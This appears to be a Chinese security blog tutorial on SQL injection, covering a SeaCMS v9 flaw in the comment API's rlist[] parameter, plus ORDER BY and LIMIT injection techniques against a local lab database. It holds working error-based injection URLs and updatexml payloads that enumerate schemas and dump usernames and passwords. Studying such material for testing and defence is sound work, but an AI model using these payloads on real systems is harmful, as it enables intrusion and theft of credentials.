---
layout: post
title: "seacmsv9注入管理员账号密码orderbylimit"
date: 2025-03-10 18:21:57 +0800
description: "1、seacms漏洞概念：海洋影视管理系统（seacms，海洋cms）是一套专为不同需求的站长而设计的视频点播系统，采用的是 php5.X+mysql 的架构。seacmsv9漏洞文件：./comment/api/index.php。漏洞参数：$rlist由，攻击者可通过构造恶意 rlist[] 参数注入SQL代码。我们进行sql语句构造报错注入出user。"
keywords: "seacmsv9注入管理员账号密码+orderby+limit"
categories: ['未分类']
tags: ['安全']
artid: "145888802"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=145888802
    alt: "seacmsv9注入管理员账号密码orderbylimit"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=145888802
featuredImagePreview: https://bing.ee123.net/img/rand?artid=145888802
cover: https://bing.ee123.net/img/rand?artid=145888802
image: https://bing.ee123.net/img/rand?artid=145888802
img: https://bing.ee123.net/img/rand?artid=145888802
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     seacmsv9注入管理员账号密码+orderby+limit
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2>
     一、seacmsv9 SQL注入
    </h2>
    <p>
     1、seacms漏洞
    </p>
    <p>
     概念：海洋影视管理系统（seacms，海洋cms）是一套专为不同需求的站长而设计的视频点播系统，采用的是 php5.X+mysql 的架构。
    </p>
    <p>
     seacmsv9漏洞文件：./comment/api/index.php。
    </p>
    <p>
     漏洞参数：$rlist
    </p>
    <pre><code>&lt;?php
session_start();
require_once("../../include/common.php");
$id = (isset($gid) &amp;&amp; is_numeric($gid)) ? $gid : 0;
$page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1;
$type = (isset($type) &amp;&amp; is_numeric($type)) ? $type : 1;
$pCount = 0;
$jsoncachefile = sea_DATA."/cache/review/$type/$id.js";
//缓存第一页的评论
if($page&lt;2)
{
	if(file_exists($jsoncachefile))
	{
		$json=LoadFile($jsoncachefile);
		die($json);
	}
}
$h = ReadData($id,$page);
$rlist = array();
if($page&lt;2)
{
	createTextFile($h,$jsoncachefile);
}
die($h);	
 
 
function ReadData($id,$page)
{
	global $type,$pCount,$rlist;
	$ret = array("","",$page,0,10,$type,$id);
	if($id&gt;0)
	{
		$ret[0] = Readmlist($id,$page,$ret[4]);
		$ret[3] = $pCount;
		$x = implode(',',$rlist);
		if(!empty($x))
		{
		$ret[1] = Readrlist($x,1,10000);
		}
	}	
	$readData = FormatJson($ret);
	return $readData;
}
 
function Readmlist($id,$page,$size)
{
	global $dsql,$type,$pCount,$rlist;
	$ml=array();
	if($id&gt;0)
	{
		$sqlCount = "SELECT count(*) as dd FROM sea_comment WHERE m_type=$type AND v_id=$id ORDER BY id DESC";
		$rs = $dsql -&gt;GetOne($sqlCount);
		$pCount = ceil($rs['dd']/$size);
		$sql = "SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND v_id=$id ORDER BY id DESC limit ".($page-1)*$size.",$size ";
		$dsql-&gt;setQuery($sql);
		$dsql-&gt;Execute('commentmlist');
		while($row=$dsql-&gt;GetArray('commentmlist'))
		{
			$row['reply'].=ReadReplyID($id,$row['reply'],$rlist);
			$ml[]="{\"cmid\":".$row['id'].",\"uid\":".$row['uid'].",\"tmp\":\"\",\"nick\":\"".$row['username']."\",\"face\":\"\",\"star\":\"\",\"anony\":".(empty($row['username'])?1:0).",\"from\":\"".$row['username']."\",\"time\":\"".date("Y/n/j H:i:s",$row['dtime'])."\",\"reply\":\"".$row['reply']."\",\"content\":\"".$row['msg']."\",\"agree\":".$row['agree'].",\"aginst\":".$row['anti'].",\"pic\":\"".$row['pic']."\",\"vote\":\"".$row['vote']."\",\"allow\":\"".(empty($row['anti'])?0:1)."\",\"check\":\"".$row['ischeck']."\"}";
		}
	}
	$readmlist=join($ml,",");
	return $readmlist;
}
 
function Readrlist($ids,$page,$size)
{
	global $dsql,$type;
	$rl=array();
	$sql = "SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC";
	$dsql-&gt;setQuery($sql);
	$dsql-&gt;Execute('commentrlist');
	while($row=$dsql-&gt;GetArray('commentrlist'))
	{
		$rl[]="\"".$row['id']."\":{\"uid\":".$row['uid'].",\"tmp\":\"\",\"nick\":\"".$row['username']."\",\"face\":\"\",\"star\":\"\",\"anony\":".(empty($row['username'])?1:0).",\"from\":\"".$row['username']."\",\"time\":\"".$row['dtime']."\",\"reply\":\"".$row['reply']."\",\"content\":\"".$row['msg']."\",\"agree\":".$row['agree'].",\"aginst\":".$row['anti'].",\"pic\":\"".$row['pic']."\",\"vote\":\"".$row['vote']."\",\"allow\":\"".(empty($row['anti'])?0:1)."\",\"check\":\"".$row['ischeck']."\"}";
	}
	$readrlist=join($rl,",");
	return $readrlist;
}
 
function ReadReplyID($gid,$cmid,&amp;$rlist)
{
	global $dsql;
	if($cmid&gt;0)
	{
		if(!in_array($cmid,$rlist))$rlist[]=$cmid;
		$row = $dsql-&gt;GetOne("SELECT reply FROM sea_comment WHERE id=$cmid limit 0,1");
		if(is_array($row))
		{
			$ReplyID = ",".$row['reply'].ReadReplyID($gid,$row['reply'],$rlist);
		}else
		{
			$ReplyID = "";
		}
	}else
	{
		$ReplyID = "";
	}
	return $ReplyID;
}
 
function FormatJson($json)
{
	$x = "{\"mlist\":[%0%],\"rlist\":{%1%},\"page\":{\"page\":%2%,\"count\":%3%,\"size\":%4%,\"type\":%5%,\"id\":%6%}}";
	for($i=6;$i&gt;=0;$i--)
	{
		$x=str_replace("%".$i."%",$json[$i],$x);
	}
	$formatJson = jsonescape($x);
	return $formatJson;
}
 
function jsonescape($txt)
{
	$jsonescape=str_replace(chr(13),"",str_replace(chr(10),"",json_decode(str_replace("%u","\u",json_encode("".$txt)))));
	return $jsonescape;
}
</code></pre>
    <p>
     由
     <a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90&amp;spm=1001.2101.3001.7020" title="源码分析">
      源码分析
     </a>
     ，攻击者可通过构造恶意 rlist[] 参数注入SQL代码。我们进行sql语句构造报错注入出user
    </p>
    <pre><code>http://127.0.0.1/upload9.1/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20user()))),@`%27`
</code></pre>
    <p>
     输入以下内容：
    </p>
    <pre><code>http://127.0.0.1/cmsv9.1/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,database())),@`%27`
</code></pre>
    <p>
     <img alt="" height="231" src="https://i-blog.csdnimg.cn/direct/7c7fff5631314d75bbdd7db636dbb166.png" width="1017"/>
    </p>
    <p>
     输入以下内容：
    </p>
    <pre><code>http://127.0.0.1/cmsv9.1/upload/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,database())),@`%27`
</code></pre>
    <p>
     <img alt="" height="125" src="https://i-blog.csdnimg.cn/direct/9bb866c847564b71a4faeb41daaefc31.png" width="1017"/>
    </p>
    <h2>
     二、order by
    </h2>
    <p>
     正常的oder by 语句：
    </p>
    <blockquote>
     <p>
      select * from users order by id desc;
     </p>
    </blockquote>
    <p>
     <br/>
     当desc此处位置参数可控时，即有可能存在oreder by注入，那么如何在这样的情况下注出我们想要的数据呢？
    </p>
    <blockquote>
     <p>
      1.如果有报错信息输出，可尝试通过报错注入完成sql注入攻击
     </p>
     <p>
      2.如果没有回显，可尝试盲注的手法来注入
     </p>
    </blockquote>
    <p>
     通过报错注入（有回显）
    </p>
    <p>
     <br/>
     这里用updatexml函数来执行报错注入的效果：
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));
ERROR 1105 (HY000): XPATH syntax error: '~security'        //获取当前数据库</code></pre>
    <p>
     <br/>
     获取数据库个数
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.schemata)),0));</code></pre>
    <p>
     <br/>
     获取数据库列表
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),0));
ERROR 1105 (HY000): XPATH syntax error: '~information_schema'
mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),0));
ERROR 1105 (HY000): XPATH syntax error: '~security'</code></pre>
    <p>
     <br/>
     获取表个数
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema = "security")),0));
ERROR 1105 (HY000): XPATH syntax error: '~4'</code></pre>
    <p>
     <br/>
     获取表名
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = "security")),0));
ERROR 1105 (HY000): XPATH syntax error: '~emails,referers,uagents,users'</code></pre>
    <p>
     <br/>
     获取字段个数
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select count(*) from information_schema.columns where table_schema = "security" and table_name = "users")),0));
ERROR 1105 (HY000): XPATH syntax error: '~3'
1</code></pre>
    <p>
     <br/>
     获取字段名
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = "security" and table_name = "users")),0));
ERROR 1105 (HY000): XPATH syntax error: '~id,username,password'</code></pre>
    <p>
     <br/>
     获取信息
    </p>
    <pre><code class="hljs">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select username from users limit 0,1)),0));
ERROR 1105 (HY000): XPATH syntax error: '~Dumb'
mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select password from users limit 0,1)),0));
ERROR 1105 (HY000): XPATH syntax error: '~Dumb'</code></pre>
    <h2>
     <br/>
     <br/>
     三、limit注入
    </h2>
    <p>
     <br/>
     一般实际过程中使用 limit 时，大概有两种情况，一种使用order by，一种就是不使用 order by关键字。
    </p>
    <h4>
     不存在 order by 关键字
    </h4>
    <p>
     执行语句
    </p>
    <blockquote>
     <p>
      select id from users limit 0,1
      <br/>
      <br/>
      这种情况下的 limit 后面可以使用union进行联合查询注入执行语句
     </p>
     <p>
     </p>
     <p>
      select id from users limit 0,1 union select username from users;
     </p>
    </blockquote>
    <h4>
     <br/>
     存在 order by 关键字
    </h4>
    <p>
     执行语句
    </p>
    <blockquote>
     <p>
      select id from users order by id desc limit 0,1;
     </p>
    </blockquote>
    <p>
     <br/>
     此时后面再次使用union将会报错
     <br/>
     除了union 就没有其他可以使用的了吗，非也
    </p>
    <p>
     此方法适用于5.0.0&lt; MySQL &lt;5.6.6版本，在limit语句后面的注入
     <br/>
     MySQL 5中的SELECT语法：
    </p>
    <pre><code class="hljs">SELECT 
    [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f37353138393439332f:61727469636c652f64657461696c732f313435383838383032" class_="artid" style="display:none">
 </p>
</div>


